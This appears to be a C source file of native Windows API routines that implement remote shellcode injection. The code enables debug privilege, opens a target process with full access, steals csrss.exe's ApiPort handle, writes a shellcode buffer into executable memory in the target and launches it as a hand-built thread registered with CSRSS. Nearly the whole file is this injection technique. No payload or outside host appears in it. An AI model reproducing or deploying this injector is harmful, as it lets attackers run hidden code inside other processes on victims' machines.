NTSTATUS XxGetOSVersion(
    OUT ULONG *OSMajorVersion,
    OUT ULONG *OSMinorVersion,
    OUT USHORT *OSBuildNumber)
{
    PVOID Teb = NULL;
    PEB *Peb = NULL;

    Teb = NtCurrentTeb();

    if(Teb == NULL)
        return STATUS_UNSUCCESSFUL;

    Peb = (PEB *)*(ULONG *)((ULONG)Teb + 0x30);

    if(OSMajorVersion)
        *OSMajorVersion = Peb->OSMajorVersion;

    if(OSMinorVersion)
        *OSMinorVersion = Peb->OSMinorVersion;

    if(OSBuildNumber)
        *OSBuildNumber = Peb->OSBuildNumber;

    return STATUS_SUCCESS;
}

NTSTATUS XxAdjustPrivileges(
    IN ULONG Privilege)
{
	NTSTATUS NtStatus;
	HANDLE TokenHandle;

	LUID Luid;
	TOKEN_PRIVILEGES TokenPrivileges;
	
	Luid.LowPart = Privilege;
	Luid.HighPart = 0;

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Luid = Luid;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	NtStatus = NtOpenProcessToken(
								  NtCurrentProcess(),					 // ProcessHandle
								  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, // DesiredAccess
								  &TokenHandle);						 // TokenHandle
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtOpenProcessToken - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	NtStatus = NtAdjustPrivilegesToken(
									   TokenHandle,		         // TokenHandle
									   FALSE,					 // DisableAllPrivileges
									   &TokenPrivileges,		 // NewState
									   sizeof(TOKEN_PRIVILEGES), // BufferLength
									   (PTOKEN_PRIVILEGES)NULL,  // PreviousState
									   0);						 // ReturnLength
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAdjustPrivilegesToken - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	NtStatus = NtClose(TokenHandle); // Handle

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	return STATUS_SUCCESS;
}

NTSTATUS XxGetProcessHandle(
    IN PWCHAR ImageFileName,
    OUT HANDLE *ProcessHandle,
    OUT HANDLE *UniqueProcess)
{
    NTSTATUS NtStatus;

    ULONG AllocationSize = PAGE_SIZE * 64;
    BOOLEAN ProcessFlag = FALSE;

    SYSTEM_PROCESSES *ProcessesAndThreadsInformation = NULL;
    PVOID BaseAddress = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;
    CLIENT_ID ClientId;


    NtStatus = XxAdjustPrivileges(SE_DEBUG_PRIVILEGE);

	if(NtStatus)
		return NtStatus;

   
    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),              // ProcessHandle
                                       &ProcessesAndThreadsInformation, // BaseAddress
                                       0,                               // ZeroBits
                                       &AllocationSize,                 // AllocationSize
                                       MEM_COMMIT,                      // AllocationType
                                       PAGE_READWRITE);                 // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory - %.8X\n", NtStatus);    
        return NtStatus;
    }

    BaseAddress = ProcessesAndThreadsInformation;


    NtStatus = NtQuerySystemInformation(
                                        SystemProcessesAndThreadsInformation, // SystemInformationClass
                                        ProcessesAndThreadsInformation,       // SystemInformation
                                        AllocationSize,                       // SystemInformationLength
                                        NULL);                                // ReturnLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation - %.8X\n", NtStatus);    
        return NtStatus;
    }

    while(ProcessesAndThreadsInformation->NextEntryDelta)
    {
        if(ProcessesAndThreadsInformation->ProcessName.Length)
        {
            if((sizeof(ImageFileName) * sizeof(USHORT)) == RtlCompareMemory(ProcessesAndThreadsInformation->ProcessName.Buffer,
			    ImageFileName, sizeof(ImageFileName) * sizeof(USHORT)))
            {
                ProcessFlag = TRUE;

                break;
            }
        }

        ProcessesAndThreadsInformation = (PSYSTEM_PROCESSES)((PUCHAR)(ProcessesAndThreadsInformation) +
										 ProcessesAndThreadsInformation->NextEntryDelta);
    }

    if(ProcessFlag == FALSE)
    {
        NtStatus = NtFreeVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &BaseAddress,       // BaseAddress
                                       &AllocationSize,    // FreeSize
                                       MEM_DECOMMIT);      // FreeType
            
        if(NtStatus)
        {
            printf(" [*] NtStatus of NtFreeVirtualMemory [2] - %.8X\n", NtStatus);
            return NtStatus;
        }

        return STATUS_UNSUCCESSFUL;
    }

    *UniqueProcess = (HANDLE)ProcessesAndThreadsInformation->ProcessId;


    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ObjectAttributes.RootDirectory = 0;
	ObjectAttributes.ObjectName = NULL;
	ObjectAttributes.Attributes = 0;
	ObjectAttributes.SecurityDescriptor = NULL;
	ObjectAttributes.SecurityQualityOfService = NULL;

    ClientId.UniqueProcess = (HANDLE)ProcessesAndThreadsInformation->ProcessId;
    ClientId.UniqueThread = NULL;
    

    NtStatus = NtOpenProcess(
                             ProcessHandle,      // ProcessHandle
                             PROCESS_ALL_ACCESS, // DesiredAccess
                             &ObjectAttributes,  // ObjectAttributes
                             &ClientId);         // ClientId

    if(NtStatus)
	{
		printf(" [*] NtStatus of NtOpenProcess - %.8X\n", NtStatus);
		return NtStatus;
	}


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &BaseAddress,
                                   &AllocationSize,
                                   MEM_DECOMMIT);
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [3] - %.8X\n", NtStatus);
        return NtStatus;
    }

    return STATUS_SUCCESS;
}

NTSTATUS  XxDuplicateHandle(
    OUT HANDLE *DuplicatedHandle,
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceUniqueProcess,
    IN PWCHAR ObjectTypeName,
    IN PWCHAR ObjectName)
{
    NTSTATUS NtStatus;

    ULONG AllocationSize1 = PAGE_SIZE * 64;
    ULONG AllocationSize2 = PAGE_SIZE * 4;
	ULONG AllocationSize3 = PAGE_SIZE * 2;
    HANDLE ObjectHandle;
    ULONG i;

    OBJECT_ATTRIBUTES ObjectAttributes;
    CLIENT_ID ClientId;
    SYSTEM_HANDLE_INFORMATION_EX *HandleInformation = NULL;
    OBJECT_TYPE_INFORMATION *TypeInformation = NULL;
    PUCHAR NameInformation = NULL;


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &HandleInformation, // BaseAddress
                                       0,                  // ZeroBits
                                       &AllocationSize1,   // AllocationSize
                                       MEM_COMMIT,         // AllocationType
                                       PAGE_READWRITE);    // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - %.8X\n", NtStatus);    
        return NtStatus;
    }


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &TypeInformation,
                                       0,
                                       &AllocationSize2,
                                       MEM_COMMIT,
                                       PAGE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - %.8X\n", NtStatus);    
        return NtStatus;
    }


	NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &NameInformation,
                                       0,
                                       &AllocationSize3,
                                       MEM_COMMIT,
                                       PAGE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [3] - %.8X\n", NtStatus);    
        return NtStatus;
    }


    NtStatus = NtQuerySystemInformation(
                                        SystemHandleInformation,
                                        HandleInformation,
                                        AllocationSize1,
                                        NULL);
    
	if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation - %.8X\n", NtStatus);
        return NtStatus;
    }

    for(i=0; i<(HandleInformation->HandleCount); i++)
    {
        if(HandleInformation->Handles[i].ProcessId == (ULONG)SourceUniqueProcess)
        {
            NtStatus = NtDuplicateObject(
                                         SourceProcessHandle,                            // SourceProcessHandle
                                         (HANDLE)(HandleInformation->Handles[i].Handle), // SourceHandle
                                         NtCurrentProcess(),                             // TargetProcessHandle
                                         &ObjectHandle,                                  // TargetHandle
                                         0,                                              // DesiredAccess
                                         0,                                              // Attributes
                                         DUPLICATE_SAME_ACCESS);                         // Options

            if(NtStatus)
            {
                printf(" [*] NtStatus of NtDuplicateObject - %.8X\n", NtStatus);
                return NtStatus;
            }


            NtStatus = NtQueryObject(
                                     ObjectHandle,                         // ObjectHandle
                                     ObjectTypeInformation,                // ObjectInformationClass
                                     TypeInformation,                      // ObjectInformation
                                     sizeof(OBJECT_TYPE_INFORMATION) + 64, // ObjectInformationLength
                                     NULL);                                // ReturnLength

            if(NtStatus)
            {
                printf(" [*] NtStatus of NtQueryObject [1] - %.8X\n", NtStatus);
                return NtStatus;
            }


            if((sizeof(ObjectTypeName) * sizeof(USHORT)) == RtlCompareMemory(TypeInformation->Name.Buffer,
                ObjectTypeName, sizeof(ObjectTypeName) * sizeof(USHORT)))
            {
				RtlFillMemory(NameInformation, 0, OBJECT_NAME_LENGTH);

				NtStatus = NtQueryObject(
										 ObjectHandle,
										 ObjectNameInformation,
										 NameInformation,
										 OBJECT_NAME_LENGTH,
										 NULL);

				if(NtStatus)
				{
					printf(" [*] NtStatus of NtQueryObject [2] - %.8X\n", NtStatus);
					return NtStatus;
				}

                if(((OBJECT_NAME_INFORMATION *)NameInformation)->Name.Buffer)
                {
				    if((sizeof(ObjectName) * sizeof(USHORT)) == RtlCompareMemory(((OBJECT_NAME_INFORMATION *)NameInformation)->Name.Buffer,
					    ObjectName, sizeof(ObjectName) * sizeof(USHORT)))
				    {
                        *DuplicatedHandle = ObjectHandle;

                        break;
				    }
                }
			}

            NtStatus = NtClose(ObjectHandle);

			if(NtStatus)
			{
				printf(" [*] NtStatus of NtClose - %.8X\n", NtStatus);    
				return NtStatus;
			}
		}
	}


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &HandleInformation,
                                   &AllocationSize1,
                                   MEM_DECOMMIT);
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - %.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &TypeInformation,
                                   &AllocationSize2,
                                   MEM_DECOMMIT);
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [2] - %.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &NameInformation,
                                   &AllocationSize3,
                                   MEM_DECOMMIT);
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [3] - %.8X\n", NtStatus);
        return NtStatus;
    }

	return STATUS_SUCCESS;			
}

NTSTATUS XxCreateThread(
    OUT HANDLE *ThreadHandle,
    OUT HANDLE *UniqueThread,
    IN HANDLE ProcessHandle,
    IN HANDLE UniqueProcess,
    IN PVOID ThreadShellCode,
    IN ULONG ThreadShellCodeLength)
{
    NTSTATUS NtStatus;

    ULONG ProcessInformationLength = PAGE_SIZE * 64;
    ULONG AllocationSize = PAGE_SIZE * 256;
    PVOID ThreadStartThunk = NULL;
    PVOID BaseAddress = NULL;
    ULONG StackReserve = 0;
    PVOID ExpandableStackBase = NULL;
    ULONG OldProtect;
    HANDLE CsrssProcessHandle;
    HANDLE CsrssUniqueProcess;
    ULONG ThreadRoutineLength = PAGE_SIZE;
    PVOID ThreadRoutine = NULL;
    HANDLE CsrPortHandle;

    SYSTEM_PROCESSES *ProcessInformation = NULL;
    USER_STACK UserStack;
    CONTEXT Context;
    CLIENT_ID ClientId;
    CSR_MESSAGE CsrMessage;

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),        // ProcessHandle
                                       &ProcessInformation,       // BaseAddress
                                       0,                         // ZeroBits
                                       &ProcessInformationLength, // AllocationSize
                                       MEM_COMMIT,                // AllocationType
                                       PAGE_READWRITE);           // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - %.8X\n", NtStatus);    
        return NtStatus;
    }

    BaseAddress = ProcessInformation;


	NtStatus = NtQuerySystemInformation(
                                        SystemProcessesAndThreadsInformation, // SystemInformationClass
                                        ProcessInformation,                   // SystemInformation
                                        ProcessInformationLength,             // SystemInformationLength
                                        NULL);                                // ReturnLength

	if(NtStatus)
    {
		printf(" [*] NtStatus of NtQuerySystemInformation - %.8X\n", NtStatus);    
        return NtStatus;
    }

    while(ProcessInformation->NextEntryDelta)
    {
		if(ProcessInformation->ProcessName.Length > 0 && ProcessInformation->ProcessName.Buffer)
        {
			if((IMAGE_NAME_LENGTH == RtlCompareMemory(ProcessInformation->ProcessName.Buffer,
                IMAGE_NAME, IMAGE_NAME_LENGTH)))
            {
                ThreadStartThunk = ((SYSTEM_THREADS *)ProcessInformation->Threads)->StartAddress;
 
                break;
            }
		}

        ProcessInformation = (SYSTEM_PROCESSES *)((PUCHAR)(ProcessInformation) +
                             ProcessInformation->NextEntryDelta);
	}


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),        // ProcessHandle
                                   &BaseAddress,              // BaseAddress
                                   &ProcessInformationLength, // FreeSize
                                   MEM_DECOMMIT);             // FreeType
            
	if(NtStatus)
    {
		printf(" [*] NtStatus of NtFreeVirtualMemory - %.8X\n", NtStatus);
        return NtStatus;
    }

    if(ThreadStartThunk == NULL)
    {
        return STATUS_UNSUCCESSFUL;
    }
    
    ///////////////////////////////////////////////////////////////////////////////////////////////

    BaseAddress = NULL;

    
    NtStatus = NtAllocateVirtualMemory(
									   ProcessHandle,
									   &BaseAddress,
									   0,
									   &AllocationSize,
									   MEM_RESERVE,
									   PAGE_READWRITE);
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - %.8X\n", NtStatus);
		return NtStatus;
	}

	UserStack.FixedStackBase = NULL;
	UserStack.FixedStackLimit = NULL;
	UserStack.ExpandableStackBase = (PVOID)((ULONG)BaseAddress + AllocationSize);
	UserStack.ExpandableStackLimit = (PVOID)((ULONG)BaseAddress + AllocationSize - PAGE_SIZE);
	UserStack.ExpandableStackBottom = BaseAddress;

	ExpandableStackBase = (PVOID)((ULONG)UserStack.ExpandableStackBase - PAGE_SIZE * 2);

	StackReserve = PAGE_SIZE * 2;


	NtStatus = NtAllocateVirtualMemory(
									   ProcessHandle,
									   &ExpandableStackBase,
									   0,
									   &StackReserve,
									   MEM_COMMIT,
									   PAGE_READWRITE);
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory [3] - %.8X\n", NtStatus);
		return NtStatus;
	}

	StackReserve = PAGE_SIZE;


	NtStatus = NtProtectVirtualMemory(
									  ProcessHandle,               // ProcessHandle
									  &ExpandableStackBase,        // BaseAddress
									  &StackReserve,               // ProtectSize
									  PAGE_READWRITE | PAGE_GUARD, // NewProtect
									  &OldProtect);                // OldProtect
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtProtectVirtualMemory - %.8X\n", NtStatus);
		return NtStatus;
	}

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = XxGetProcessHandle(
                                  L"csrss.exe",         // ImageFileName
                                  &CsrssProcessHandle,  // ProcessHandle
                                  &CsrssUniqueProcess); // UniqueProcess

    if(NtStatus)
	{
		printf(" [*] NtStatus of XxGetProcess - %.8X\n", NtStatus);
		return NtStatus;
	}

    
    NtStatus = XxDuplicateHandle(
                                 &CsrPortHandle,         // DuplicatedHandle
                                 CsrssProcessHandle,     // SourceProcessHandle
                                 CsrssUniqueProcess,     // SourceUniqueProcess
                                 L"Port",                // ObjectTypeName
                                 L"\\Windows\\ApiPort"); // ObjectName

    if(NtStatus)
	{
		printf(" [*] NtStatus of XxDuplicateHandle - %.8X\n", NtStatus);
		return NtStatus;
	}

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtAllocateVirtualMemory(
									   ProcessHandle,
									   &ThreadRoutine,
									   0,
									   &ThreadShellCodeLength,
									   MEM_COMMIT,
									   PAGE_EXECUTE_READWRITE);
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory [4] - %.8X\n", NtStatus);
		return NtStatus;
	}


    NtStatus = NtWriteVirtualMemory(
                                    ProcessHandle,         // ProcessHandle
                                    ThreadRoutine,         // BaseAddress
                                    ThreadShellCode,       // Buffer
                                    ThreadShellCodeLength, // BufferLength
                                    NULL);                 // ReturnLength

    if(NtStatus)
	{
		printf(" [*] NtStatus of NtWriteVirtualMemory - %.8X\n", NtStatus);
		return NtStatus;
	}

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Context.SegGs = 0x00;
	Context.SegFs = 0x38;
	Context.SegEs = 0x20;
	Context.SegDs = 0x20;
	Context.SegSs = 0x20;
	Context.SegCs = 0x18;
	Context.EFlags = 0x3000;
    Context.ContextFlags = 0x10007;
    Context.Eax = (ULONG)ThreadRoutine;
    Context.Ebx = 0x00;
	Context.Esp = (ULONG)UserStack.ExpandableStackBase;
	Context.Eip = (ULONG)ThreadStartThunk;
    

	NtStatus = NtCreateThread(
							  ThreadHandle,      // ThreadHandle
							  THREAD_ALL_ACCESS, // DesiredAccess
							  NULL,              // ObjectAttributes
							  ProcessHandle,     // ProcessHandle
							  &ClientId,         // ClientId
							  &Context,          // ThreadContext
							  &UserStack,        // UserStack
							  TRUE);             // CreateSuspended
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtCreateThread - %.8X\n", NtStatus);
		return NtStatus;
	}

    *UniqueThread = ClientId.UniqueThread;

	///////////////////////////////////////////////////////////////////////////////////////////////

	RtlZeroMemory(&CsrMessage, sizeof(CSR_MESSAGE));

    CsrMessage.DataLength = 0x1C;
    CsrMessage.TotalLength = 0x38;
    CsrMessage.ApiNumber = 0x00010001;
    CsrMessage.ThreadHandle = *ThreadHandle;
    CsrMessage.ClientId.UniqueProcess = ClientId.UniqueProcess;
    CsrMessage.ClientId.UniqueThread = ClientId.UniqueThread;
       

    NtStatus = NtRequestWaitReplyPort(
									  CsrPortHandle, // PortHandle
									  &CsrMessage,   // RequestMessage
									  &CsrMessage);  // ReplyMessage
		
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtRequestWaitReplyPort - %.8X\n", NtStatus);
		return NtStatus;
	}

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtResumeThread(
                              *ThreadHandle, // ThreadHandle
                              NULL);         // PreviousSuspendCount
    
    if(NtStatus)
	{
		printf(" [*] NtStatus of NtResumeThread - %.8X\n", NtStatus);
		return NtStatus;
	}
    
    return STATUS_SUCCESS;
}